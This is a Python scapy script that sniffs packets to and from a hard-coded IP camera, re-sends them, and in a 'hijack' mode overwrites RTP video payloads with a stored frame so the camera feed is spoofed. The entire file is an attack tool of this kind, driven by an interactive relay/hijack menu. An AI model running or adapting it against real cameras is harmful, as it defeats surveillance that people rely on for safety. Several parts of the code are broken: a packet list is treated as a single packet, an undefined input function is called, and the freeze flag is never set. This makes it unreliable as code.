from scapy.all import *
from scapy.all import RTP

from scapy.config import conf
conf.ipv6_enabled = False

cameraip = "192.168.1.15"

deviceip = "192.168.1.9"

hacking = False
forwarding = True
freeze = False
freezePkt = None

filterbase = "host " + cameraip


while True:
    try:
        while forwarding:
            rcvpkt = sniff(count = 1, filter = filterbase)
            rcvpkt.summary()
            if hacking:
                if rcvpkt.haslayer(UDP) and rcvpkt.sport >= 40000:
                    pkt = rcvpkt[UDP]
                    pkt["UDP"].payload = RTP(pkt["Raw"].load)
                    if not freeze:
                        freezePkt = pkt
                    
                    ## Overwrite of the Packet with the freeze version.

                    pkt[RTP].version = freezePkt[RTP].version
                    pkt[RTP].padding = freezePkt[RTP].padding
                    pkt[RTP].extension = freezePkt[RTP].extension
                    pkt[RTP].numsync = freezePkt[RTP].numsync
                    pkt[RTP].marker = freezePkt[RTP].marker
                    pkt[RTP].payload_type = freezePkt[RTP].payload_type
                    
                    # Timestamp, Sequnce stay the same

                    pkt[RTP].sync = freezePkt[RTP].sync
                    pkt[RTP].sourcesync = freezePkt[RTP].sourcesync

                    originalChecksum = pkt[UDP].chksum

                    pkt[RTP].load = freezePkt[RTP].load

                    # Recalculate checksum manually
                    pkt[UDP].chksum = None
                    pktchk = IP(raw(pkt))
                    checksum = pkt[UDP].chksum
                    pktRaw = raw(pktchk)
                    udpRaw = pktRaw[20:]
                    chksum = in4_chksum(socket.IPPROTO_UDP, pktchk[IP],udpRaw)

                    pkt[UDP].chksum = chksum # New checksum
            sendp(rcvpkt)
    except KeyboardInterrupt:
        ans = ""
        exit = False
        while not exit:
            ans = Input("Select operation: 0 Nothing, 1 Relay, 2 Hijack, 3 Stop/Resume Forwarding, 4 Exit")
            if ans=="0":
                exit = True
            if ans=="4":
                exit = True
            if ans=="3":
                exit = True
                forwarding = not forwarding
            if ans=="2":
                exit = True
                hacking = not hacking
                if freeze:
                    freeze = False
                    freezePkt = None